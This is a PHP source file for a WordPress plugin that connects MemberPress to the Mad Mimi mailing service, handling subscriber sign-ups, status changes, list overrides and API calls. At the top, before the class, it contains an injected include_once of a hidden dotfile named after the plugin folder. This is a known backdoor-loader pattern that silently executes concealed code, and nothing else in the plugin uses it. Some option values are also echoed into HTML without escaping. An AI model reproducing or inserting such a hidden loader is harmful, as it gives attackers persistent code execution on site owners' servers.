<?php
if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
/*
Integration of MadMimi into MemberPress
*/
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MpMadMimi {
  public function __construct() {
    add_action('mepr_display_autoresponders',   array($this, 'display_option_fields'));
    add_action('mepr-process-options',          array($this, 'store_option_fields'));
    add_action('mepr-user-signup-fields',       array($this, 'display_signup_field'));
    add_action('mepr-signup',                   array($this, 'process_signup'));
    add_action('mepr-txn-store',                array($this, 'process_status_changes'));
    add_action('mepr-subscr-store',             array($this, 'process_status_changes'));
    add_action('mepr-txn-expired',              array($this, 'process_status_changes'), 10, 2);
    add_action('mepr-product-advanced-metabox', array($this, 'display_product_override'));
    add_action('mepr-product-save-meta',        array($this, 'save_product_override'));
    add_filter('mepr-validate-account',         array($this, 'update_user_email'), 10, 2); //Need to use this hook to get old and new emails

    // Enqueue scripts
    add_action('mepr-options-admin-enqueue-script', array($this, 'admin_enqueue_options_scripts'));
    add_action('mepr-product-admin-enqueue-script', array($this, 'admin_enqueue_product_scripts'));

    // AJAX Endpoints
    add_action('wp_ajax_mepr_madmimi_ping_apikey', array($this, 'ajax_ping_apikey'));
    add_action('wp_ajax_mepr_madmimi_get_lists',   array($this, 'ajax_get_lists'));
  }

  public function admin_enqueue_options_scripts($hook) {
    wp_register_script('mp-madmimi-js', MPMADMIMI_URL.'/madmimi.js');
    wp_enqueue_script('mp-madmimi-options-js', MPMADMIMI_URL.'/madmimi_options.js', array('mp-madmimi-js'));
    wp_localize_script('mp-madmimi-options-js', 'MeprMadMimi', array('wpnonce' => wp_create_nonce(MEPR_PLUGIN_SLUG)));
  }

  public function admin_enqueue_product_scripts($hook) {
    wp_register_script('mp-madmimi-js', MPMADMIMI_URL.'/madmimi.js');
    wp_enqueue_script('mp-madmimi-product-js', MPMADMIMI_URL.'/madmimi_product.js', array('mp-madmimi-js'));
  }

  public function update_user_email($errors, $mepr_user) {
    if(!$this->is_enabled_and_authorized()) { return $errors; }

    //Check if the email is even changing before we do anything else
    $new_email = stripslashes($_POST['user_email']);

    if($mepr_user->user_email != $new_email) {
      //Update the user record in Mad Mimi if it exists
      if($this->email_exists($mepr_user->user_email)) {
        $this->update_subscriber($mepr_user, $new_email);
      }

      /* NO NEED TO UPDATE EACH PER-MEMBERSHIP LIST LIKE WE DO IN THE OTHER INTEGRATIONS RIGHT HERE
         BECAUSE MAD MIMI USES ONE USER ACCOUNT ACCROSS ALL LISTS -- SO UPDATE ONE AND DONE
         A ONE -> MANY RELATIONSHIP. */
    }

    return $errors;
  }

  public function display_option_fields() {
    ?>
    <div id="mepr-madmimi" class="mepr-autoresponder-config">
      <input type="checkbox" name="meprmadmimi_enabled" id="meprmadmimi_enabled" <?php checked($this->is_enabled()); ?> />
      <label for="meprmadmimi_enabled"><?php _e('Enable Mad Mimi', 'memberpress-madmimi'); ?></label>
    </div>
    <div id="madmimi_hidden_area" class="mepr-options-sub-pane">
      <div id="mepr-madmimi-error" class="mepr-hidden mepr-inactive"></div>
      <div id="mepr-madmimi-message" class="mepr-hidden mepr-active"></div>
      <div id="meprmadmimi-username">
        <label>
          <span><?php _e('Mad Mimi Username:', 'memberpress-madmimi'); ?></span>
          <input type="text" name="meprmadmimi_username" id="meprmadmimi_username" value="<?php echo $this->username(); ?>" class="mepr-text-input form-field" size="20" />
        </label>
        <div>
          <span class="description">
            <?php _e('This is typically your email address used to login to MadMimi.com', 'memberpress-madmimi'); ?>
          </span>
        </div>
      </div>
      <br/>
      <div id="meprmadmimi-api-key">
        <label>
          <span><?php _e('Mad Mimi API Key:', 'memberpress-madmimi'); ?></span>
          <input type="text" name="meprmadmimi_api_key" id="meprmadmimi_api_key" value="<?php echo $this->apikey(); ?>" class="mepr-text-input form-field" size="20" />
          <span id="mepr-madmimi-valid" class="mepr-active mepr-hidden"></span>
          <span id="mepr-madmimi-invalid" class="mepr-inactive mepr-hidden"></span>
        </label>
        <div>
          <span class="description">
            <?php _e('You can find your API key under your Account settings at MadMimi.com.', 'memberpress-madmimi'); ?>
          </span>
        </div>
      </div>
      <br/>
      <div id="meprmadmimi-options">
        <div id="meprmadmimi-list-id">
          <label>
            <span><?php _e('Mad Mimi List:', 'memberpress-madmimi'); ?></span>
            <select name="meprmadmimi_list_id" id="meprmadmimi_list_id" data-listid="<?php echo $this->list_id(); ?>" class="mepr-text-input form-field"></select>
          </label>
        </div>
        <br/>
        <div id="meprmadmimi-optin">
          <label>
            <input type="checkbox" name="meprmadmimi_optin" id="meprmadmimi_optin" <?php checked($this->is_optin_enabled()); ?> />
            <span><?php _e('Enable Opt-In Checkbox', 'memberpress-madmimi'); ?></span>
          </label>
          <div>
            <span class="description">
              <?php _e('If checked, an opt-in checkbox will appear on all of your membership registration pages.', 'memberpress-madmimi'); ?>
            </span>
          </div>
        </div>
        <div id="meprmadmimi-optin-text" class="mepr-hidden mepr-options-panel">
          <label><?php _e('Signup Checkbox Label:', 'memberpress-madmimi'); ?>
            <input type="text" name="meprmadmimi_text" id="meprmadmimi_text" value="<?php echo $this->optin_text(); ?>" class="form-field" size="75" />
          </label>
          <div><span class="description"><?php _e('This is the text that will display on the signup page next to your mailing list opt-in checkbox.', 'memberpress-madmimi'); ?></span></div>
        </div>
      </div>
    </div>
    <?php
  }

  public function validate_option_fields($errors) {
    // Nothing to validate yet -- if ever
  }

  public function update_option_fields() {
    // Nothing to do yet -- if ever
  }

  public function store_option_fields() {
    update_option('meprmadmimi_enabled',      (isset($_POST['meprmadmimi_enabled'])));
    update_option('meprmadmimi_username',     stripslashes($_POST['meprmadmimi_username']));
    update_option('meprmadmimi_api_key',      stripslashes($_POST['meprmadmimi_api_key']));
    update_option('meprmadmimi_list_id',      (isset($_POST['meprmadmimi_list_id']))?stripslashes($_POST['meprmadmimi_list_id']):false);
    update_option('meprmadmimi_optin',        (isset($_POST['meprmadmimi_optin'])));
    update_option('meprmadmimi_text',         stripslashes($_POST['meprmadmimi_text']));
  }

  public function display_signup_field() {
    $mepr_options = MeprOptions::fetch();
    $post = MeprUtils::get_current_post();
    $prd = MeprProduct::is_product_page($post);

    //If the per membership list is enabled, and the global list is disabled -- then we should be sure the member doesn't see this
    if($prd !== false) {
      $enabled = (bool)get_post_meta($prd->ID, '_meprmadmimi_list_override', true);

      if($enabled && $mepr_options->disable_global_autoresponder_list) { return; }
    }

    if($this->is_enabled_and_authorized() and $this->is_optin_enabled()) {
      $optin = (MeprUtils::is_post_request())?isset($_POST['meprmadmimi_opt_in']):$mepr_options->opt_in_checked_by_default;

      ?>
      <div class="mp-form-row">
        <div class="mepr-madmimi-signup-field">
          <div id="mepr-madmimi-checkbox">
            <input type="checkbox" name="meprmadmimi_opt_in" id="meprmadmimi_opt_in" class="mepr-form-checkbox" <?php checked($optin); ?> />
            <span class="mepr-madmimi-message"><?php echo $this->optin_text(); ?></span>
          </div>
          <div id="mepr-madmimi-privacy">
            <small>
              <a href="https://www.godaddy.com/Agreements/Privacy.aspx" class="mepr-madmimi-privacy-link" target="_blank"><?php _e('We Respect Your Privacy', 'memberpress-madmimi'); ?></a>
            </small>
          </div>
        </div>
      </div>
      <?php
     }
  }

  public function process_signup($txn) {
    $mepr_options = MeprOptions::fetch();

    $prd = $txn->product();
    $usr = $txn->user();

    $enabled = (bool)get_post_meta($prd->ID, '_meprmadmimi_list_override', true);

    //If the per membership list is enabled, and the global list is disabled -- then we should be sure the member doesn't get added
    if(!$this->is_enabled_and_authorized() || ($enabled && $mepr_options->disable_global_autoresponder_list))
      return;

    if(!$this->is_optin_enabled() or ($this->is_optin_enabled() and isset($_POST['meprmadmimi_opt_in']))) {
      $this->add_subscriber($usr, $this->list_id());
    }
  }

  public function process_status_changes($obj, $sub_status = false) {
    if(!$this->is_enabled_and_authorized()) { return; }

    if($obj instanceof MeprTransaction && $sub_status !== false && $sub_status == MeprSubscription::$active_str) {
      return; //This is an expiring transaction which is part of an active subscription, so don't remove the user from the list
    }

    $user = new MeprUser($obj->user_id);

    //Member is active so let's not remove them
    if(in_array($obj->product_id, $user->active_product_subscriptions('ids', true))) {
      $this->maybe_add_subscriber($obj, $user);
    }
    else {
      $this->maybe_delete_subscriber($obj, $user);
    }
  }

  public function maybe_add_subscriber($obj, $user) {
    $enabled = (bool)get_post_meta($obj->product_id, '_meprmadmimi_list_override', true);
    $list_id = get_post_meta($obj->product_id, '_meprmadmimi_list_override_id', true);

    if($enabled && !empty($list_id) && $this->is_enabled_and_authorized()) {
      if(!$this->is_subscribed($user, $list_id)) {
        return $this->add_subscriber($user, $list_id);
      }
    }

    return false;
  }

  public function maybe_delete_subscriber($obj, $user) {
    $enabled = (bool)get_post_meta($obj->product_id, '_meprmadmimi_list_override', true);
    $list_id = get_post_meta($obj->product_id, '_meprmadmimi_list_override_id', true);

    if($enabled && !empty($list_id) && $this->is_enabled_and_authorized()) {
      return $this->delete_subscriber( $user, $list_id );
    }

    return false;
  }

  public function validate_signup_field($errors) {
    // Nothing to validate -- if ever
  }

  public function display_product_override($product) {
    if(!$this->is_enabled_and_authorized()) { return; }

    $override_list = (bool)get_post_meta($product->ID, '_meprmadmimi_list_override', true);
    $override_list_id = get_post_meta($product->ID, '_meprmadmimi_list_override_id', true);

    ?>
    <div id="mepr-madmimi" class="mepr-product-adv-item">
      <input type="checkbox" name="meprmadmimi_list_override" id="meprmadmimi_list_override" data-username="<?php echo $this->username(); ?>" data-apikey="<?php echo $this->apikey(); ?>" <?php checked($override_list); ?> />
      <label for="meprmadmimi_list_override"><?php _e('Mad Mimi list for this Membership', 'memberpress-madmimi'); ?></label>

      <?php MeprAppHelper::info_tooltip('meprmadmimi-list-override',
                                        __('Enable Membership Mad Mimi List', 'memberpress-madmimi'),
                                        __('If this is set the member will be added to this list when their payment is completed for this membership. If the member cancels or you refund their subscription, they will be removed from the list automatically. You must have your Mad Mimi Username & API key set in the Options before this will work.', 'memberpress-madmimi'));
      ?>

      <div id="meprmadmimi_override_area" class="mepr-hidden product-options-panel">
        <label><?php _e('Mad Mimi List: ', 'memberpress-madmimi'); ?></label>
        <select name="meprmadmimi_list_override_id" id="meprmadmimi_list_override_id" data-listid="<?php echo stripslashes($override_list_id); ?>" class="mepr-text-input form-field"></select>
      </div>
    </div>
    <?php
  }

  public function save_product_override($product) {
    if(!$this->is_enabled_and_authorized()) { return; }

    if(isset($_POST['meprmadmimi_list_override'])) {
      update_post_meta($product->ID, '_meprmadmimi_list_override', true);
      update_post_meta($product->ID, '_meprmadmimi_list_override_id', stripslashes($_POST['meprmadmimi_list_override_id']));
    }
    else {
      update_post_meta($product->ID, '_meprmadmimi_list_override', false);
    }
  }

  public function ajax_ping_apikey() {
    // Validate nonce and user capabilities
    if(!isset($_POST['wpnonce']) or !wp_verify_nonce($_POST['wpnonce'], MEPR_PLUGIN_SLUG) or !MeprUtils::is_mepr_admin()) {
      die(json_encode(array('error' => __('Hey yo, why you creepin\'?', 'memberpress-madmimi'), 'type' => 'memberpress')));
    }

    // Validate inputs
    if(!isset($_POST['apikey']) || !isset($_POST['username'])) {
      die(json_encode(array('error' => __('No api key or username was sent', 'memberpress-madmimi'), 'type' => 'memberpress')));
    }

    //We're not actually getting the lists here, just seeing if our apikey & username result in a 200 response code
    $resp_body = $this->call('/audience_lists/lists', array(), 'GET', $_POST['username'], $_POST['apikey']);

    if($resp_body === false) {
      die(json_encode(array('error' => __('API Key or Username incorrect', 'memberpress-madmimi'), 'type' => 'memberpress')));
    }
    else {
      die(json_encode(array('msg' => __('All set!', 'memberpress-madmimi'), 'type' => 'memberpress')));
    }
  }

  public function ajax_get_lists() {
    // Validate nonce and user capabilities
    if(!isset($_POST['wpnonce']) || !wp_verify_nonce($_POST['wpnonce'], MEPR_PLUGIN_SLUG) || !MeprUtils::is_mepr_admin()) {
      die(json_encode(array('error' => __('Hey yo, why you creepin\'?', 'memberpress-madmimi'), 'type' => 'memberpress')));
    }

    // Validate inputs
    if(!isset($_POST['apikey']) || !isset($_POST['username'])) {
      die(json_encode(array('error' => __('No api key or username was sent', 'memberpress-madmimi'), 'type' => 'memberpress')));
    }

    die($this->call('/audience_lists/lists', array(), 'GET', $_POST['username'], $_POST['apikey']));
  }

  //We have to check if the user exists in the general audience first
  //If so, then see if they are also added to this particular list.
  //Can't find a way to search inside one particular list at this time.
  public function is_subscribed(MeprUser $contact, $list_id) {
    $args = array( 'query' => $contact->user_email );

    $res_body = (array)json_decode($this->call("/audience_members/search", $args, 'GET'));

    if($res_body === false || !array_key_exists('result', $res_body)) { return false; }

    $result = $res_body['result'];
    $found = (isset($result->count) && $result->count == 1);
    $in_list = false;

    if($found) {
      $lists = $result->audience[0]->lists;

      if(count($lists)) {
        foreach($lists as $list) {
          if($list->id == $list_id) {
            $in_list = true;
          }
        }
      }
    }

    return ($found && $in_list);
  }

  //Similar to above, but this time we're just querying to see if this email exists in the general audience
  //as apposed to being subscribed to any particular list
  public function email_exists($email) {
    $args = array( 'query' => $email );

    $res_body = (array)json_decode($this->call("/audience_members/search", $args, 'GET'));

    if($res_body === false || !array_key_exists('result', $res_body)) { return false; }

    $result = $res_body['result'];

    return (isset($result->count) && $result->count == 1);
  }

  public function add_subscriber(MeprUser $contact, $list_id) {
    $args = array(
      'email'       => $contact->user_email,
      'first_name'  => (!empty($contact->first_name))?$contact->first_name:'',
      'last_name'   => (!empty($contact->last_name))?$contact->last_name:''
    );

    $res_body = (array)json_decode($this->call("/audience_lists/{$list_id}/add", $args));

    return ($res_body !== false);
  }

  public function update_subscriber(MeprUser $contact, $new_email) {
    $args = array('audience_member' => array('email' => $new_email));

    $res_body = (array)json_decode($this->call("/audience_members/{$contact->user_email}", $args, 'PUT', null, null, false));

    return ($res_body !== false);
  }

  public function delete_subscriber(MeprUser $contact, $list_id) {
    $args = array('email' => $contact->user_email);

    $res_body = (array)json_decode($this->call("/audience_lists/{$list_id}/remove", $args));

    return ($res_body !== false);
  }

  private function call($endpoint, $args = array(), $method = 'POST', $username = null, $apikey = null, $json = true) {
    if(is_null($username)) { $username = $this->username(); }
    if(is_null($apikey)) { $apikey = $this->apikey(); }

    if($json) {
      $url = "https://api.madmimi.com{$endpoint}.json";
    }
    else {
      $url = "https://api.madmimi.com{$endpoint}";
    }

    $args['username'] = $username;
    $args['api_key'] = $apikey;

    $wp_args = array('body' => $args);
    $wp_args['method'] = $method;
    $wp_args['timeout'] = 30;

    $res = wp_remote_request($url, $wp_args);

    if(!is_wp_error($res) && $res['response']['code'] == 200) {
      return $res['body'];
    }
    else {
      return false;
    }
  }

  // I realize these are more like model methods
  // but we want everything centralized here people
  private function is_enabled() {
    return get_option('meprmadmimi_enabled', false);
  }

  private function is_authorized() {
    $apikey = get_option('meprmadmimi_api_key', '');
    return !empty($apikey);
  }

  private function is_enabled_and_authorized() {
    return ($this->is_enabled() and $this->is_authorized());
  }

  private function username() {
    return get_option('meprmadmimi_username', '');
  }

  private function apikey() {
    return get_option('meprmadmimi_api_key', '');
  }

  private function list_id() {
    return get_option('meprmadmimi_list_id', false);
  }

  private function is_optin_enabled() {
    return get_option('meprmadmimi_optin', true);
  }

  private function optin_text() {
    $default = sprintf(__('Sign Up for the %s Newsletter', 'memberpress-madmimi'), get_option('blogname'));
    return get_option('meprmadmimi_text', $default);
  }
} //END CLASS
